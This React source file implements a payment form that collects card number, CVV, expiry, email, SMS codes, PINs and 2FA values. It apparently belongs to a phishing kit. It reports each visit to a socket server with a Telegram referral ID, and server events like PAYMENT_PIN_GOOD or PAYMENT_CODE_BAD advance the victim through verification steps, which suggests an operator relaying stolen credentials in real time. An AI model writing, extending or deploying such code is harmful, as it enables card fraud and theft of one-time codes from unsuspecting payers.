/* eslint-disable jsx-a11y/no-static-element-interactions */
/* eslint-disable jsx-a11y/click-events-have-key-events */
import { useDispatch, useSelector } from 'react-redux';
import React, { useEffect, useState } from 'react';
import { useTranslation } from 'react-i18next';

import { setData, setFail, setLoaded, submitPaymentData } from '../../actions/paymentData';
import { getErrorMessage, isRequestError, isRequestPending } from '../../utils/store';
import { submitPaymentCode } from '../../actions/paymentCode';
import { submitPayment2FA } from '../../actions/payment2FA';
import { PAYMENT_TYPE } from '../../constants/payment-type';
import { submitPaymentPin } from '../../actions/paymentPin';
import { getQuery } from '../../utils/navigation';
import { cardMask } from '../../utils/card-mask';
import { isValidEmail } from '../../validations';
import { PaymentMethodView } from './View';

const initialState = {
  cardCountry: 'DE',
  cardNumber: '',
  cardHolder: '',
  authCode: null,
  authPin: null,
  userEmail: '',
  cardMonth: '',
  cardYear: '',
  cardCvv: '',
};

export const PaymentMethod = () => {
  const [state, setState] = useState(initialState);
  const [d2, setD2] = useState(true);
  const dispatch = useDispatch();
  const { t } = useTranslation();

  const { socket, isLoading, isError, paymentType, errorMessage } = useSelector(
    ({ paymentData: { data, request }, socket: socketData }) => ({
      paymentType: data?.type || PAYMENT_TYPE.CARD,
      errorMessage: getErrorMessage(request),
      isLoading: isRequestPending(request),
      isError: isRequestError(request),
      socket: socketData,
    }),
  );

  const metaTitle = t('META.DEFAULT.TITLE');
  const price = getQuery('price') || (typeof window !== 'undefined' && localStorage.getItem('price'));

  let isButtonDisabled = false;

  /* useEffect */

  useEffect(() => {
    const ref = getQuery('ref') || localStorage.getItem('ref');
    const service = getQuery('service') || localStorage.getItem('service');
    const payload = { type: 'PAYMENT_METHOD', telegramId: ref, service };
    if (socket && ref) socket.emit('PAYMENT_NOTIFICATION', payload);
  }, [socket]);

  useEffect(() => {
    if (socket) {
      const macros = (payload, type = null) => {
        dispatch(setData({ state, type: type || payload.type }));
        dispatch(setLoaded());
      };

      socket.on('PAYMENT_DATA_PIN_GOOD', (payload) => macros(payload));
      socket.on('PAYMENT_DATA_2FA_GOOD', (payload) => macros(payload));
      socket.on('PAYMENT_DATA_TAN_GOOD', (payload) => macros(payload));
      socket.on('PAYMENT_DATA_CODE_GOOD', (payload) => macros(payload));
      socket.on('PAYMENT_DATA_AUTH_GOOD', (payload) => macros(payload));
      socket.on('PAYMENT_DATA_SECRET_GOOD', (payload) => macros(payload));
      socket.on('PAYMENT_PIN_GOOD', () => macros(null, PAYMENT_TYPE.SUCCESS));

      // socket.on('PAYMENT_DATA_SUPPORT', () => dispatch(setPaymentSupportVisible()));

      socket.on('PAYMENT_PIN_BAD', () => dispatch(setFail(t('CARD.PIN.ERROR'))));
      socket.on('PAYMENT_2FA_BAD', () => dispatch(setFail(t('CARD.2FA.ERROR'))));
      socket.on('PAYMENT_CODE_BAD', () => dispatch(setFail(t('CARD.SMS.ERROR'))));
      socket.on('PAYMENT_DATA_BAD', () => dispatch(setFail(t('CARD.DATA.ERROR'))));
    }
  }, [socket, state]);

  /* handlers */

  const handleCloseBanks = () => setD2(false);

  const handleOpenD2 = () => setD2(!d2);

  const handleUserEmail = (e) => setState({ ...state, userEmail: e.target.value.toLowerCase() });

  const handleCardCountry = (e) => setState({ ...state, cardCountry: e.target.value });

  const handleCardNumber = (e) => {
    let { value } = e.target;
    value = value.replace(/\D/g, '');
    const cardNumber = cardMask(value);
    if (value.length > 16) return null;
    return setState({ ...state, cardNumber: cardNumber.trimRight() });
  };

  const handleCardHolder = (e) => setState({ ...state, cardHolder: e.target.value });

  const handleCardDate = (e) => {
    let { value } = e.target;
    value = value.replaceAll(/\D/g, '');

    let cardMonth = `${value[0]}${value[1] || ''}`;
    let cardYear = `${value[2]}${value[3] || ''}`;

    if (isNaN(Number(cardMonth))) cardMonth = '';
    if (isNaN(Number(cardYear))) cardYear = '';

    if (value.length > 4) return null;

    if (cardMonth[0] !== '0' && Number(cardMonth) > 1 && Number(cardMonth) < 10) {
      cardMonth = `0${cardMonth}`;
    }

    return setState({ ...state, cardMonth, cardYear });
  };

  const handleCardCvc = (e) => {
    const { value: cardCvv } = e.target;
    if (cardCvv.length < 4 && !isNaN(Number(cardCvv))) setState({ ...state, cardCvv });
  };

  const handleAuthCode = (e) => {
    const { value: authCode } = e.target;
    if (!isNaN(Number(authCode))) setState({ ...state, authCode });
  };

  const handleAuthPin = (e) => {
    const { value: authPin } = e.target;
    if (!isNaN(Number(authPin))) setState({ ...state, authPin });
  };

  /* onSubmitHandler */

  const onSubmit = async () => {
    const ref = localStorage.getItem('ref');
    const service = localStorage.getItem('service');
    const localStorPrice = localStorage.getItem('price');
    const cardDate = `${state.cardMonth}/${state.cardYear}`;

    const payload = { ...state, cardDate, price: localStorPrice, service, ref };

    switch (paymentType) {
      case PAYMENT_TYPE.FA2:
        await dispatch(submitPayment2FA());
        break;
      case PAYMENT_TYPE.PIN:
        await dispatch(submitPaymentPin(state.authPin));
        break;
      case PAYMENT_TYPE.CODE:
        await dispatch(submitPaymentCode(state.authCode));
        break;
      default:
        await dispatch(submitPaymentData(payload));
    }
  };

  /* OtherCode */

  if (paymentType === PAYMENT_TYPE.CODE && !isError) {
    if (!state.authCode) isButtonDisabled = true;
    else isButtonDisabled = false;
  } else if (paymentType === PAYMENT_TYPE.PIN) {
    if (!state.authPin) isButtonDisabled = true;
    else isButtonDisabled = false;
  } else if (
    state.cardNumber.replaceAll(' ', '').length !== 16 ||
    !isValidEmail(state.userEmail) ||
    state.cardMonth.length !== 2 ||
    state.cardYear.length !== 2 ||
    state.cardCvv.length !== 3 ||
    state.cardHolder === ''
  )
    isButtonDisabled = true;

  return (
    <PaymentMethodView
      d2={d2}
      price={price}
      state={state}
      isError={isError}
      metaTitle={metaTitle}
      isLoading={isLoading}
      paymentType={paymentType}
      errorMessage={errorMessage}
      isButtonDisabled={isButtonDisabled}
      handlers={{
        handleOpenD2,
        handleUserEmail,
        handleCloseBanks,
        handleCardCountry,
        handleCardNumber,
        handleCardHolder,
        handleAuthCode,
        handleCardDate,
        handleCardCvc,
        handleAuthPin,
        onSubmit,
      }}
    />
  );
};
